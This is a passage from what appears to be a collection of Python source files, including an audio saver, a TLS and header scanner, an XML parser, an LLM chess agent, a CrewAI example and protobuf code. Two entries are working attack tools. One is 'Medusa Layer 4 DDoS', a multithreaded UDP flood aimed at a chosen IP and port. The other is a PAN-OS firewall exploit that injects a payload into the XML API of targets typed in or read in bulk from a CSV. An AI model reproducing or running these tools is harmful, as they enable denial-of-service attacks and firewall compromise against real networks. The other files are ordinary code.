os.path.join(base_output_dir, 'audio')\n        os.makedirs(output_dir, exist_ok=True)\n        output_path = os.path.join(output_dir, filename + '.' + save_format)\n\n        if os.path.exists(output_path) and not overwrite_existing:\n            output_path = increment_filename_no_overwrite(output_path)\n\n        with open(output_path, 'wb') as f:\n            f.write(wav_bytes)\n        return (0, )\n",
    "import socket\nimport sys, os\nimport threading\nimport time\nimport random\n\nif len(sys.argv) < 5:\n  print(\"\"\"\\033[0m\n\n\n\n\\033[0m           \u2588\u2580\u2584\u2580\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2584 \u2588\u2500\u2500\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2588 \\033[31m \u2588\u2580\u2580\u2584 \u2588\u2580\u2580\u2584 \u2588\u2580\u2580\u2588 \u2588\u2580\u2580 \n\\033[0m           \u2588\u2500\u2580\u2500\u2588 \u2588\u2580\u2580 \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2580\u2580\u2588 \u2588\u2584\u2584\u2588 \\033[31m \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2580\u2580\u2588 \n\\033[0m           \u2580\u2500\u2500\u2500\u2580 \u2580\u2580\u2580 \u2580\u2580\u2580\u2500 \u2500\u2580\u2580\u2580 \u2580\u2580\u2580 \u2580\u2500\u2500\u2580 \\033[31m \u2580\u2580\u2580\u2500 \u2580\u2580\u2580\u2500 \u2580\u2580\u2580\u2580 \u2580\u2580\u2580     \n\\033[33m       \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\\033[33m       \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\\033[33m       \u2551            Welcome To \\033[31mMedusa Layer 4 DDoS            \\033[33m\u2551\n\\033[33m       \u2551      \\x1b[38;2;255;20;147m\u25ba\u25ba \\033[0mThis tool for Layer 4 Attack \\033[31m(\\033[0mUDP \\033[31m& \\033[0mTCP\\033[31m)     \\033[33m\u2551\n\\033[33m       \u2551           Telegram \\x1b[38;2;255;20;147m: \\033[32mhttps://t.me/RipperSec          \\033[33m\u2551\n\\033[33m       \u2551                 Developer \\x1b[38;2;255;20;147m: \\033[0mTrashDono                \\033[33m\u2551\n\\033[33m       \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\\033[0m\"\"\")\n  sys.exit(\"\\x1b[38;2;255;20;147m\u25ba\u25ba \\033[0mUsage\\x1b[38;2;255;20;147m: \\033[0mpython3 \\033[33mMedusaL4 \\033[0m<\\033[32mtimes\\033[0m> <\\033[32mip\\033[0m> <\\033[32mport\\033[0m> <\\033[32mpacket\\033[0m> <\\033[32mthreads\\033[0m>\")\n\nprint(\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttack Started!\")\nip = str(sys.argv[1])\nport = int(sys.argv[2])\npacket = int(sys.argv[3])\nthreads = int(sys.argv[4])\ntimes = float(sys.argv[5])\n\ntimeout = time.time() + 1 * times\n\ndef udp(ip, port, packet, times):\n  timeout = time.time() + 1 * times\n  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)\n  print(f\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttacking... \\x1b[31m>  \\x1b[0mtime \\x1b[32m{times} \\x1b[0mip \\x1b[32m{ip}\\x1b[31m:\\x1b[32m{port}\\x1b[0m packet \\x1b[32m{packet}\\x1b[0m threads \\x1b[32m{threads}\\x1b[0m \")\n  while time.time() < timeout:\n    try:\n      try:\n        data = random._urandom(int(random.randint(1025, 65505)))\n        for _ in range(packet):\n          s.sendto(data, (str(ip), int(port)))\n      except:\n        s.close()\n    except:\n      s.close()\n  print(\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] > \\x1b[0mSuccessfully Attack!\")\n\ndef main():\n  global threads\n  for _ in range(threads):\n    thread = []\n    th = threading.Thread(target=udp, args=(ip, port, packet, times))\n    thread.append(th)\n    th.start()\n\nif __name__ == '__main__':\n  try:\n    main()\n  except KeyboardInterrupt:\n    print('\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttack Over!')\n    sys.exit()\n",
    "import subprocess\nimport ssl\nimport socket\nimport sys\nimport requests\nimport random\nimport urllib3\nimport argparse\nimport json\nimport dns.resolver\nimport os\nimport hashlib\nimport shutil\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nfrom colorama import Fore, Style\nfrom urllib.parse import urlparse\nfrom instagramy import InstagramUser\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass bcolors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\n#for later use\ndef print_centered(text):\n    terminal_width = shutil.get_terminal_size().columns\n    padding_width = (terminal_width - len(text)) // 2\n    print(\" \" * padding_width + text)\n\ndef print_banner_with_border(text):\n    terminal_width = shutil.get_terminal_size().columns\n    text_length = len(text)\n    #print(\"\\n\")\n    print(Style.BRIGHT + \"-\" * (text_length + 4) + Style.RESET_ALL)  # Above Header\n    print(Style.BRIGHT + f\"| {text} |\" + Style.RESET_ALL)  # Header\n    print(Style.BRIGHT + \"-\" * (text_length + 4) + Style.RESET_ALL)  # Below Header\n\n\ndef print_banner(url):\n    ascii_banner = \"\"\"\n                                            \n\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n                                                  \n    \"\"\"\n    print(ascii_banner)\n\ndef print_url(url):\n    print(f\"{bcolors.BOLD}{Fore.BLUE}{url}{Style.RESET_ALL}\\n\")  # User-supplied URL\n\ndef check_ssl_versions(url):\n    if url.startswith(\"http://\"):\n        print(\"HTTP protocol in use, skipping...\")\n        return\n\n    if url.startswith(\"https://\"):\n        try:\n            context = ssl.create_default_context()\n            context.minimum_version = ssl.TLSVersion.TLSv1_2\n            context.maximum_version = ssl.TLSVersion.TLSv1_3\n\n            url = url[8:]  # remove \"https://\"\n\n            with socket.create_connection((url, 443)) as sock:\n                with context.wrap_socket(sock, server_hostname=url) as ssock:\n                    ssl_version = ssock.version()\n                    print(f\"{url} TLS in use. Version: {ssl_version}\")\n\n        except ssl.SSLError as e:\n            if \"sslv3 alert handshake failure\" in str(e):\n                print(f\"{url} {Fore.RED}SSLv3 in use.{Style.RESET_ALL}\")\n            elif \"sslv2 alert handshake failure\" in str(e):\n                print(f\"{url} {Fore.RED}SSLv2 in use.{Style.RESET_ALL}\")\n            else:\n                print(f\"{url} SSL/TLS version unknown.\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n    else:\n        print(\"Invalid URL.\")\n\n\ndef check_sslv2_support(url):\n    try:\n        if url.startswith(\"http://\"):\n            return\n        elif url.startswith(\"https://\"):\n            url = url[8:]\n            \n        result = subprocess.run(['openssl', 's_client', '-connect', f'{url}:443', '-ssl2'], capture_output=True, text=True, timeout=10)\n        if \"SSL-Session:\" in result.stdout:\n            print(f\"{url} {Fore.RED}SSLv2 supported.{Style.RESET_ALL}\")\n        else:\n            print(f\"{url} {Fore.GREEN}SSLv2 doesn't supported.{Style.RESET_ALL}\")\n    except subprocess.TimeoutExpired:\n        print(\"\u0130\u015flem zaman a\u015f\u0131m\u0131na u\u011frad\u0131.\")\n    except Exception as e:\n        print(f\"Hata: {e}\")\n\ndef check_sslv3_support(url):\n    try:\n        if url.startswith(\"http://\"):\n            return\n        elif url.startswith(\"https://\"):\n            url = url[8:]\n            \n        result = subprocess.run(['openssl', 's_client', '-connect', f'{url}:443', '-ssl3'], capture_output=True, text=True, timeout=10)\n        if \"SSL-Session:\" in result.stdout:\n            print(f\"{url} {Fore.RED}SSLv3 supported.{Style.RESET_ALL}\")\n        else:\n            print(f\"{url} {Fore.GREEN}SSLv3 doesn't supported.{Style.RESET_ALL}\")\n    except subprocess.TimeoutExpired:\n        print(\"The process has timed out.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef check_security_headers(url):\n    try:\n        response = requests.get(url, verify=False)\n        headers = response.headers\n\n        security_headers = {\n            \"X-Content-Type-Options\": \"X-Content-Type-Options\" in headers,\n            \"X-Frame-Options\": \"X-Frame-Options\" in headers,\n            \"Content-Security-Policy\": \"Content-Security-Policy\" in headers,\n            \"X-XSS-Protection\": \"X-XSS-Protection\" in headers,\n            \"Strict-Transport-Security\": \"Strict-Transport-Security\" in headers,\n            \"Referrer-Policy\": \"Referrer-Policy\" in headers,\n            \"Feature-Policy\": \"Feature-Policy\" in headers\n        }\n\n        return security_headers\n    except Exception as e:\n        print(\"Error:\", e)\n",
    "from __future__ import annotations\n\nimport sys\nfrom collections.abc import Awaitable, Callable\nfrom os import PathLike\nfrom ssl import SSLContext\nfrom typing import Generic, TypeVar\n\nfrom submodules.trio.src.trio import CancelScope\n\nfrom ._tasks import TASK_STATUS_IGNORED, Nursery, TaskStatus\nfrom .abc import AsyncResource, HalfCloseableStream, ReceiveStream, SendStream\n\nif sys.version_info >= (3, 12):\n    from typing import Buffer\nelse:\n    from typing_extensions import Buffer\n\nT_Stream = TypeVar(\"T_Stream\")\nT_Listener = TypeVar(\"T_Listener\")\nSendStreamT = TypeVar(\"SendStreamT\", bound=SendStream)\nReceiveStreamT = TypeVar(\"ReceiveStreamT\", bound=ReceiveStream)\n\n\nclass SocketStream:\n    pass\n\n\nclass SSLStream(Generic[T_Stream]):\n    pass\n\n\nclass SocketListener:\n    pass\n\n\nclass SSLListener(Generic[T_Listener]):\n    pass\n\n\nasync def open_tcp_stream(\n    host: str | bytes,\n    port: int,\n    *,\n    happy_eyeballs_delay: float | None = 0.25,\n    local_address: str | None = None,\n) -> SocketStream:\n    raise NotImplementedError\n\n\nasync def serve_tcp(\n    handler: Callable[[SocketStream], Awaitable[object]],\n    port: int,\n    *,\n    host: str | bytes | None = None,\n    backlog: int | None = None,\n    handler_nursery: Nursery | None = None,\n    task_status: TaskStatus[list[SocketListener]] = TASK_STATUS_IGNORED,\n) -> None:\n    raise NotImplementedError\n\n\nasync def open_ssl_over_tcp_stream(\n    host: str | bytes,\n    port: int,\n    *,\n    https_compatible: bool = False,\n    ssl_context: SSLContext | None = None,\n    happy_eyeballs_delay: float | None = 0.25,\n) -> SSLStream[SocketStream]:\n    raise NotImplementedError\n\n\nasync def serve_ssl_over_tcp(\n    handler: Callable[[SSLStream[SocketStream]], Awaitable[object]],\n    port: int,\n    ssl_context: SSLContext,\n    *,\n    host: str | bytes | None = None,\n    https_compatible: bool = False,\n    backlog: int | None = None,\n    handler_nursery: Nursery | None = None,\n    task_status: TaskStatus[list[SSLListener[SocketStream]]] = TASK_STATUS_IGNORED,\n) -> None:\n    raise NotImplementedError\n\n\nasync def open_unix_socket(\n    filename: str | bytes | PathLike[str] | PathLike[bytes],\n) -> SocketStream:\n    raise NotImplementedError\n\n\nasync def open_tcp_listeners(\n    port: int, *, host: str | bytes | None = None, backlog: int | None = None\n) -> list[SocketListener]:\n    raise NotImplementedError\n\n\nasync def open_ssl_over_tcp_listeners(\n    port: int,\n    ssl_context: SSLContext,\n    *,\n    host: str | bytes | None = None,\n    https_compatible: bool = False,\n    backlog: int | None = None,\n) -> list[SSLListener[SocketStream]]:\n    raise NotImplementedError\n\n\nasync def aclose_forcefully(resource: AsyncResource) -> None:\n    with CancelScope() as cs:\n        cs.cancel()\n        await resource.aclose()\n\n\nclass StapledStream(HalfCloseableStream, Generic[SendStreamT, ReceiveStreamT]):\n    def __init__(self, send_stream: SendStreamT, receive_stream: ReceiveStreamT):\n        self.send_stream = send_stream\n        self.receive_stream = receive_stream\n\n    async def send_all(self, data: Buffer) -> None:\n        return await self.send_stream.send_all(data)\n\n    async def wait_send_all_might_not_block(self) -> None:\n        return await self.send_stream.wait_send_all_might_not_block()\n\n    async def send_eof(self) -> None:\n        if isinstance(self.send_stream, HalfCloseableStream):\n            await self.send_stream.send_eof()\n        else:\n            await self.send_stream.aclose()\n\n    async def receive_some(self, max_bytes: int | None = None) -> bytes:\n        return await self.receive_stream.receive_some(max_bytes)\n\n    async def aclose(self) -> None:\n        try:\n            await self.send_stream.aclose()\n        finally:\n            await self.receive_stream.aclose()\n",
    "import os,time,random\nimport xml.etree.ElementTree as ET\nimport pandas as pd\nimport glob\nimport csv\n\nimport multiprocessing as mp\nimport concurrent.futures\nfrom tqdm import tqdm\nfrom joblib import Parallel, delayed\n\ndef flatten(matrix):\n    return [item for i in tqdm(matrix) for item in i]\n\ndef perData_process(xml_file,ns):\n    tree = ET.parse(xml_file)\n    root = tree.getroot()\n    perDataProcess = []\n\n    for actSummary in root.findall('act:activities-summary',ns):\n        for edu in actSummary.findall('act:educations',ns):\n            for eduAffiliationGroup in edu.findall('act:affiliation-group',ns):\n                for eduSummary in eduAffiliationGroup.findall('edu:education-summary',ns):\n                    eduStartDate = 0\n                    eduOrgName = eduOrgCity = eduOrgCountry = eduOrgRegion = None\n\n                    for eduStartDateElement in eduSummary.findall('com:start-date',ns):\n                        for eduStartDateYearElement in eduStartDateElement.findall('com:year',ns):\n                            eduStartDate += 10000 * int(eduStartDateYearElement.text)\n                        for eduStartDateMonthElement in eduStartDateElement.findall('com:month',ns):\n                            eduStartDate += 100 * int(eduStartDateMonthElement.text)\n                        for eduStartDateDayElement in eduStartDateElement.findall('com:day',ns):\n                            eduStartDate += int(eduStartDateDayElement.text)\n\n                    for eduOrg in eduSummary.findall('com:organization',ns):\n                        eduOrgName = eduOrg.find('com:name',ns).text\n\n                        for eduAddress in eduOrg.findall('com:address',ns):\n                            eduOrgCity = eduAddress.find('com:city',ns).text\n                            eduOrgCountry = eduAddress.find('com:country',ns).text\n\n                            for eduOrgRegionElement in eduAddress.findall('com:region',ns):\n                                eduOrgRegion = eduOrgRegionElement.text\n\n                    if eduStartDate != 0 and eduOrgName is not None:\n                        perDataProcess.append({'StartDate': eduStartDate,\n                            'OrgName': eduOrgName, 'OrgCity': eduOrgCity, 'OrgRegion': eduOrgRegion, 'OrgCountry': eduOrgCountry})\n\n        for emp in actSummary.findall('act:employments',ns):\n            for empAffiliationGroup in emp.findall('act:affiliation-group',ns):\n                for empSummary in empAffiliationGroup.findall('emp:employment-summary',ns):\n                    empStartDate = 0\n                    empOrgName = empOrgCity = empOrgRegion = empOrgCountry = None\n\n                    for empStartDateElement in empSummary.findall('com:start-date',ns):\n                        for empStartDateYearElement in empStartDateElement.findall('com:year',ns):\n                            empStartDate += 10000 * int(empStartDateYearElement.text)\n                        for empStartDateMonthElement in empStartDateElement.findall('com:month',ns):\n                            empStartDate += 100 * int(empStartDateMonthElement.text)\n                        for empStartDateDayElement in empStartDateElement.findall('com:day',ns):\n                            empStartDate += int(empStartDateDayElement.text)\n\n                    for empOrg in empSummary.findall('com:organization',ns):\n                        empOrgName = empOrg.find('com:name',ns).text\n\n                        for empAddress in empOrg.findall('com:address',ns):\n                            empOrgCity = empAddress.find('com:city',ns).text\n                            empOrgCountry = empAddress.find('com:country',ns).text\n\n                            for empOrgRegionElement in empAddress.findall('com:region',ns):\n                                empOrgRegion = empOrgRegionElement.text\n\n                    if empStartDate != 0 and empOrgName is not None:\n                        perDataProcess.append({'StartDate': empStartDate,\n                            'OrgName': empOrgName, 'OrgCity': empOrgCity, 'OrgRegion': empOrgRegion, 'OrgCountry': empOrgCountry})\n\n    return perDataProcess\n\ndef perData_proc_batch(batch,ns):\n  return [perData_process(xml_file,ns)\n    for xml_file in tqdm(batch)]\n\ndef perData_batch_file(array,n_workers):\n  file_len = len(array)\n  batch_size = round(file_len / n_workers)\n  batches = [array[ix : ix + batch_size]\n    for ix in tqdm(range(0,file_len,batch_size))]\n  return batches\n\ndef perData_sortDate(x):\n    return x['StartDate']\n\ndef dataFlow_process(perDataElement):\n    perDataCouName = []\n    dataFlowProcess = []\n    \n    lenPerDataElement = len(perDataElement)\n    for x in tqdm(range(lenPerDataElement)):\n        perDataElementX = perDataElement[x]\n\n        lenPerDataElementX = len(perDataElement[x])\n        for y in range(1,lenPerDataElementX):\n            ori = perDataElementX[y-1]\n            des = perDataElementX[y]\n    \n            dataFlowOrigin = ori['OrgCountry']\n            dataFlowDestination = des['OrgCountry']\n ",
    "from transformers import pipeline\nfrom mh_agent import MHAgent\nfrom mh_chess import MHChess\nimport torch\n\nclass MHLLama3(MHAgent):\n    def __init__(self, model_name='meta-llama/Meta-Llama-3-8B-Instruct', color='white'):\n        self.model_name = model_name\n        self.name = self.getname()\n        self.color = color\n        self.pipeline = pipeline(\n            \"text-generation\",\n            model=model_name,\n            model_kwargs={\"torch_dtype\": torch.bfloat16},\n            device=\"cuda\",\n        )\n\n    def getname(self):\n        if '8b' in self.model_name:\n            return 'Llama3-8b'\n        elif '70b' in self.model_name:\n            return 'Llama3-70b'\n\n    def makeMove(self, board):\n        prompt = self.generatePrompt(board)\n        ans = self.generateResponse(prompt)\n        ##  Validate the move...\n        legal_moves = board.getLegalMoves()\n        for move in legal_moves:\n            if move in ans:\n                return move, ans\n        return None, ans\n\n\n    def generateResponse(self, input_text):\n        system_message = f\"You are a professional chess player. You are playing a game of chess as {self.color}. P, N, B, R, Q and K represent white pieces. p, n, b, r, q and k represent black pieces. It's your turn to make a move. You will get a list of legal moves you can make. You should choose one of them. You should only output the UCI notation of the move you want to make with no additional text.\"\n        messages = [\n            {\"role\": \"system\", \"content\": system_message},\n            {\"role\": \"user\", \"content\": input_text},\n        ]\n        \n        prompt = self.pipeline.tokenizer.apply_chat_template(\n            messages, \n            tokenize=False, \n            add_generation_prompt=True\n        )\n\n        terminators = [\n            self.pipeline.tokenizer.eos_token_id,\n            self.pipeline.tokenizer.convert_tokens_to_ids(\"<|eot_id|>\")\n        ]\n\n        outputs = self.pipeline(\n            prompt,\n            max_new_tokens=256,\n            eos_token_id=terminators,\n            do_sample=True,\n            temperature=0.6,\n            top_p=0.9,\n        )\n        return outputs[0][\"generated_text\"][len(prompt):]\n\n    def generatePrompt(self, board):\n        message = \"Here's the current board state:\\n\\n\" + str(board) + \"\\n\\n\"\n        message += \"Here's a list of possible moves:\\n- \"\n        message += \"\\n- \".join(board.getLegalMoves()) + \"\\n\\n\"\n        message += \"Please make a move by choosing one of the above options. You should only output the UCI notation of the move you want to make with no additional text.\"\n        return message\n\n\nif __name__ == \"__main__\":\n    mh_llama3 = MHLLama3()\n    board = MHChess()\n    for i in range(10):\n        move, ans = mh_llama3.makeMove(board)\n        print(move, ans)\n        board.makeMove(move)\n    ",
    "import csv\nimport requests\n\ndef exploit_firewall(target_ip, payload, root_ca=None):\n    url = f\"https://{target_ip}/api/\"\n\n    data = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <request>\n        <op cmd=\"test\" />\n        <cmd code=\"ping\">{payload}</cmd>\n    </request>\"\"\"\n\n    headers = {\n        \"User-Agent\": \"PAN-OS-Exploit\",\n        \"Content-Type\": \"application/xml\"\n    }\n\n    try:\n        if root_ca:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=root_ca)\n        else:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)\n\n        response.raise_for_status()\n\n        if \"Success\" in response.text:\n            print(f\"Exploited successfully against {target_ip}!\")\n        else:\n            print(f\"Exploit failed for {target_ip}.\")\n            print(\"Response:\")\n            print(response.text)\n\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to exploit {target_ip}: {e}\")\n\ndef main():\n    choice = input(\"Do you want to enter values directly (D) or use a CSV file (C)? \").strip().lower()\n    \n    if choice == 'd':\n        while True:\n            target_ip = input(\"Enter the IP address of the vulnerable PAN-OS firewall (or 'q' to quit): \")\n            if target_ip.lower() == 'q':\n                break\n            root_ca = input(\"Enter the path to the root CA certificate (leave blank to disable certificate verification): \").strip()\n            payload = input(\"Enter the payload to execute: \")\n            exploit_firewall(target_ip, payload, root_ca)\n    elif choice == 'c':\n        csv_file = input(\"Enter the path to the CSV file: \")\n\n        with open(csv_file, newline='') as csvfile:\n            reader = csv.reader(csvfile)\n            next(reader)  # Skip header row if present\n            for row in reader:\n                target_ip, payload, root_ca = row\n                exploit_firewall(target_ip, payload, root_ca)\n    else:\n        print(\"Invalid choice. Please enter 'D' for entering values directly or 'C' for using a CSV file.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "'''\nName\n    main.py\n\nAuthor\n    Written by Rip&Tear - CrewAI Discord Moderator .riptear\n    \nDate Sat 13th Apr 2024\n    \nDescription\n    This is a basic example of how to use the CrewAI library to create a simple research task. \n    The task is to research the topic of \"70s and 80s British rock bands\" and provide 5 paragraphs of information on the topic. \n    The task is assigned to a single agent (Researcher) who will use the ChatOllama model to generate the information. \n    The result of the task is written to a file called \"research_result.txt\".\n\nUsage\n    python main.py\n    \nOutput\n    The output of the task is written to a file called \"research_result.txt\".'''\n\n# Import required libraries - make sure the crewai and langchain_community packages are installed via pip\nimport os\nfrom crewai import Agent\nfrom crewai import Task\nfrom crewai import Crew, Process\n\nos.environ['OPENAI_API_BASE']='http://localhost:11434/v1'\nos.environ['OPENAI_API_KEY']='sk-111111111111111111111111111111111111111111111111'\nos.environ['OPENAI_MODEL_NAME']='mistral:7b-instruct-q4_0'\n\n# Create a function to log to a file with the date as the filename - this will be used as a callback function for the agent. this could be as complex as you like\ndef write_result_to_file(result):\n    filename = 'raw_output.log'\n    with open(filename, 'a') as file:\n        file.write(str(result))\n\n# Create the agent\nresearcher = Agent(\n    role='Researcher', # Think of this as the job title\n    goal='Research the topic', # This is the goal that the agent is trying to achieve\n    backstory='As an expert in the field of {topic}, you will research the topic and provide the necessary information', # This is the backstory of the agent, this helps the agent to understand the context of the task\n    max_iter=3, # This is the maximum number of iterations that the agent will use to generate the output\n    max_rpm=100, # This is the maximum number of requests per minute that the agent can make to the language model\n    verbose=True, # This is a flag that determines if the agent will print more output to the console \n    step_callback=write_result_to_file, # This is a callback function that will be called after each iteration of the agent\n    Allow_Delegation=False, # This is a flag that determines if the agent can delegate the task to another agent. As we are only using one agent, we set this to False\n    cache=False, # Indicates if the agent should use a cache for tool usage. A tool is not used in this example, so we set this to False\n)  \n\n# Create the task\nresearch_task = Task(\n    description='Research the topic', # This is a description of the task\n    agent=researcher, # This is the agent that will be assigned the task\n    expected_output='5 paragpahs of information on the topic', # This is the expected output of the taskafter its completion\n    verbose=True, # This is a flag that determines if the task will print more output to the console\n    output_file='research_result.txt' # This is the file where the output of the task will be written to, in this case, it is \"research_result.txt\"\n)           \n\n# Create the crew  \ncrew = Crew(\n  agents=[researcher], # This is a list of agents that will be part of the crew\n  tasks=[research_task], # This is a list of tasks that the crew will be assigned\n  process=Process.sequential, # This is the process that the crew will use to complete the tasks, in this case, we are using a sequential process\n  verbose=True, # This is a flag that determines if the crew will print more output to the console\n  memory=False, # This is a flag that determines if the crew will use memory to store information about the tasks in a vector database\n  cache=False, # This is a flag that determines if the crew will use a cache. A cache is not needed in this example, so we set this to False\n  max_rpm=100, # This is the maximum number of requests per minute that the crew can make to the language model \n)\n\n# Starting start the crew\nresult = crew.kickoff(inputs={'topic': '70s, 80s and 90s Australian rock bands'}) # Change the topic to whatever you want to research\nprint(result)\n",
    "# -*- coding: utf-8 -*-\n# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: device_management_backend.proto\n\"\"\"Generated protocol buffer code.\"\"\"\nfrom google.protobuf.internal import builder as _builder\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import descriptor_pool as _descriptor_pool\nfrom google.protobuf import symbol_database as _symbol_database\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\nfrom . import private_membership_rlwe_pb2 as private__membership__rlwe__pb2\n\n\nDESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\\n\\x1f\\x64\\x65vice_management_backend.proto\\x12\\x15\\x65nterprise_management\\x1a\\x1dprivate_membership_rlwe.proto\\\"\\xb9\\x01\\n\\x0bLicenseType\\x12H\\n\\x0clicense_type\\x18\\x01 \\x01(\\x0e\\x32\\x32.enterprise_management.LicenseType.LicenseTypeEnum\\\"`\\n\\x0fLicenseTypeEnum\\x12\\r\\n\\tUNDEFINED\\x10\\x00\\x12\\x11\\n\\rCDM_PERPETUAL\\x10\\x01\\x12\\x0e\\n\\nCDM_ANNUAL\\x10\\x02\\x12\\t\\n\\x05KIOSK\\x10\\x03\\x12\\x10\\n\\x0c\\x43\\x44M_PACKAGED\\x10\\x04\\\"G\\n\\nSignedData\\x12\\x0c\\n\\x04\\x64\\x61ta\\x18\\x01 \\x01(\\x0c\\x12\\x11\\n\\tsignature\\x18\\x02 \\x01(\\x0c\\x12\\x18\\n\\x10\\x65xtra_data_bytes\\x18\\x03 \\x01(\\x05\\\"V\\n\\x17\\x43heckUserAccountRequest\\x12\\x12\\n\\nuser_email\\x18\\x01 \\x01(\\t\\x12\\'\\n\\x18\\x65nrollment_nudge_request\\x18\\x02 \\x01(\\x08:\\x05\\x66\\x61lse\\\"\\xe3\\x10\\n\\x15\\x44\\x65viceRegisterRequest\\x12\\x12\\n\\nreregister\\x18\\x01 \\x01(\\x08\\x12\\x43\\n\\x04type\\x18\\x02 \\x01(\\x0e\\x32\\x31.enterprise_management.DeviceRegisterRequest.Type:\\x02TT\\x12\\x12\\n\\nmachine_id\\x18\\x03 \\x01(\\t\\x12\\x15\\n\\rmachine_model\\x18\\x04 \\x01(\\t\\x12\\x13\\n\\x0brequisition\\x18\\x06 \\x01(\\t\\x12\\x1f\\n\\x17server_backed_state_key\\x18\\x07 \\x01(\\x0c\\x12\\x43\\n\\x06\\x66lavor\\x18\\x08 \\x01(\\x0e\\x32\\x33.enterprise_management.DeviceRegisterRequest.Flavor\\x12\\x38\\n\\x0clicense_type\\x18\\t \\x01(\\x0b\\x32\\\".enterprise_management.LicenseType\\x12\\\\\\n\\x08lifetime\\x18\\x0b \\x01(\\x0e\\x32\\x35.enterprise_management.DeviceRegisterRequest.Lifetime:\\x13LIFETIME_INDEFINITE\\x12\\x12\\n\\nbrand_code\\x18\\x0c \\x01(\\t\\x12\\x1f\\n\\x17reregistration_dm_token\\x18\\r \\x01(\\t\\x12\\x1c\\n\\x14\\x65thernet_mac_address\\x18\\x0e \\x01(\\t\\x12\\x18\\n\\x10\\x64ock_mac_address\\x18\\x0f 